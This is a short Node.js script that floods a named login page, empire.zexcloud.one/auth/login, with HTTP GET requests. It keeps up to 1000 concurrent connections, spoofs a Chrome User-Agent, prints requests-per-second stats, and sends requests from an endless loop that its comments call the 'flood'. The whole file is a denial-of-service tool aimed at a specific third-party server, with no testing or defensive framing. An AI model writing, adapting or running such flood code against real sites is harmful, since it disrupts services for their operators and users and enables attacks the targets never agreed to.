const http = require('http');
const https = require('https');
const url = require('url');
const { performance } = require('perf_hooks');

// Set max concurrency
const MAX_CONCURRENT_REQUESTS = 1000;  // Max concurrent requests
const TARGET_URL = 'https://empire.zexcloud.one/auth/login';  // Target URL for the flood

// Tracking metrics
let totalRequests = 0;
let activeRequests = 0;
let startTime = performance.now();

// Utility to make a single HTTP request
function makeRequest() {
    const parsedUrl = url.parse(TARGET_URL);
    const protocol = parsedUrl.protocol === 'https:' ? https : http;

    const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (protocol === https ? 443 : 80),
        path: parsedUrl.path,
        method: 'GET',
        headers: {
            'Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
    };

    const req = protocol.request(options, (res) => {
        res.on('data', () => {}); // Read and discard data to keep the connection alive
        res.on('end', () => {
            activeRequests--;
            totalRequests++;
            checkConcurrency();
        });
    });

    req.on('error', (e) => {
        activeRequests--;
        checkConcurrency();
    });

    req.end();
}

// Function to ensure we hit max concurrency
function checkConcurrency() {
    if (activeRequests < MAX_CONCURRENT_REQUESTS) {
        const remainingRequests = MAX_CONCURRENT_REQUESTS - activeRequests;
        for (let i = 0; i < remainingRequests; i++) {
            activeRequests++;
            makeRequest();
        }
    }
}

// Function to display stats
function displayStats() {
    const elapsedTime = (performance.now() - startTime) / 1000;  // Time in seconds
    const rps = totalRequests / elapsedTime;

    console.clear();
    console.log(`Requests per second: ${rps.toFixed(2)}`);
    console.log(`Total Requests: ${totalRequests}`);
    console.log(`Active Requests: ${activeRequests}`);
    console.log(`Elapsed Time: ${elapsedTime.toFixed(2)} seconds`);
}

// Main loop to continuously flood the server with requests
function startFlood() {
    setInterval(() => {
        displayStats();
    }, 1000);  // Update stats every second

    while (true) {
        makeRequest();
        activeRequests++;
    }
}

// Start the flooder
startFlood();
